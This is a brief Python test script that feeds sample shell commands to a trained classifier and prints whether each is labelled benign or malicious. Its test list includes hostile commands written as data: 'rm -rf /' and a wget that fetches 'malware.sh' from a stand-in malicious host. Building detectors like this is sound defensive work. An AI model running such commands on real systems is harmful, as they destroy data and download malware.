from scripts.malicious_input_engine import load_trained_model, analyze_keystroke

# Load the trained model
vectorizer, clf = load_trained_model()

# Simulate a stream of commands
test_commands = [
    "ls -la",  # Benign
    "rm -rf /",  # Malicious
    "echo 'Hello World!'",  # Benign
    "wget http://malicious.com/malware.sh",  # Malicious
    "python -m http.server 8080",  # Malicious
    "cd /var/log",  # Benign
]

# Classify each command
for command in test_commands:
    result = analyze_keystroke(command, vectorizer, clf)
    label = "Malicious" if result else "Benign"
    print(f"Command: {command} -> {label}")
